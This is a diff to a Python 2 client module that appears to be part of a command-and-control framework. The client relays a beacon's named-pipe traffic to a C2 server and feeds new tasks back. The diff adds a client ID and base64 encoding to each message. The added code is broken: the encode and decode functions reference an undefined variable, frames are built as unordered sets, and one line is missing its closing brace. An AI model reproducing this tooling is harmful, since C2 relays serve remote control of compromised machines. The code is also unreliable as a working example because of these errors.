@@ -2,6 +2,8 @@ from ctypes import *
 from ctypes.wintypes import *
 from sys import exit
 from time import sleep
+import base64
+
 
 # <encoder imports>
 
@@ -30,6 +32,7 @@ from time import sleep
 # Client core
 C2_BLOCK_TIME = int(```[var:::c2_block_time]```)
 CDLL_NAME = ```[var:::cdll_name]```
+CLIENT_ID = ```[var:::client_id]```
 
 maxlen = 1024*1024
 lib = CDLL(CDLL_NAME)
@@ -58,6 +61,12 @@ def WritePipe(hPipe,chunk):
 	print "ret=%s"%ret
 	return(ret)
 
+def task_encode(task):
+    return base64.b64encode(data)
+
+def task_decode(task):
+    return base64.b64decode(data)
+
 def go():
 	print "Waiting for stager..." # DEBUG
 	p = recvData()
@@ -85,17 +94,19 @@ def interact(handle_beacon):
 		else:
 			print "Received %d bytes from pipe" % (len(chunk))
 		print "relaying chunk to server"
-		sendData(chunk)
+		resp_frame = {CLIENT_ID, task_encode(chunk)}
+		sendData(resp_frame)
 
 		# LOGIC TO CHECK FOR A NEW TASK
 		print "Checking for new tasks from transport"
 		
 		newTask = recvData()
+		newTask_frame = {newTask[0], task_decode(newTask[1])
 
-		print "Got new task: %s" % (newTask)
-		print "Writing %s bytes to pipe" % (len(newTask))
-		r = WritePipe(handle_beacon, newTask)
-		print "Write %s bytes to pipe" % (r)
+		print "Got new task: %s" % (newTask_frame[1])
+		print "Writing %s bytes to pipe" % (len(newTask_frame[1]))
+		r = WritePipe(handle_beacon, newTask_frame[1])
+		print "Wrote %s bytes to pipe" % (r)
 		sleep(C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
 
 # Prepare the transport module
